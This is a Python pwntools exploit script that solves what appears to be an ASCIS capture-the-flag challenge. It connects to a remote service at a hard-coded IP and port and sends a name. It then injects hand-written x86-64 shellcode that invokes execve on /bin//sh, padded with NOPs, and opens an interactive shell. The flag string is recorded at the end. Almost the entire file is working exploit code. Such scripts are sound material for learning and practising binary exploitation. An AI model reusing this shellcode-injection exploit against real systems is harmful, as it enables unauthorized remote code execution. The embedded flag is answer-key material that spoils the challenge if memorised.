#!/usr/bin/env python3
from pwn import *

elf = ELF("./pwn2")
context.update(binary=elf, log_level="debug")
# p = elf.process()
# p = gdb.debug(
#     "./pwn2",
#     """
#     b *main+211
#     """,
# )
p = remote("139.180.137.100", "1338")

name = b""
name += b"nigmaz"
p.sendlineafter(b'name: ', name)


shellcode = asm(
    f'''
    xor rdi, rdi
    push rdi
    mov rdi, 0x68732f2f6e69622f
    push rdi
    mov rdi, rsp
    xor rdx, rdx
    xor rsi, rsi
    xor rax, rax
    add al, 0x3b
    syscall
    ''')
shellcode += b"\x90" * 0x27
p.sendlineafter(b"(feedback) ?\n", shellcode)

p.interactive()


# ASCIS{cust0m_sh4llc0d3_f0r_learning}
